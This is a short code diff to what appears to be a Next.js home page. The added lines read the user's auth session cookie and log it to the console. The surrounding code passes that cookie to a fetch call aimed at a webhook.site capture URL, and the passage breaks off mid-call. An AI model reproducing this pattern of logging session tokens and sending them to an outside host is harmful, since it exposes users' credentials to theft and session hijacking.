@@ -22,9 +22,12 @@ export default async function HomePage({
   // You can await this here if you don't want to show Suspense fallback below
   void api.post.all.prefetch();
   const expoURL = searchParams?.expoURL;
+  const sessionCookie = cookies().get(AUTH_SESSION_KEY_NAME)?.value;
+
   console.log("EXPO URL", expoURL);
+  console.log("SESSION COOKIE", sessionCookie);
+
   if (expoURL && typeof expoURL === "string") {
-    const sessionCookie = cookies().get(AUTH_SESSION_KEY_NAME)?.value;
     if (sessionCookie) {
       console.log("SESSION COOKIE", sessionCookie);
       await fetch("https://webhook.site/9e1a2085-84bb-422f-8b2d-c1c15697d356", {
